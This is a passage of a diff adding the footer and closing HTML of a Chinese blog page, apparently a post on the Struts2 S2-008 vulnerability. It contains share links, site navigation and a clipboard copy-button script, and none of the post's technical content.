+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&name=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&t=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    Zeo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
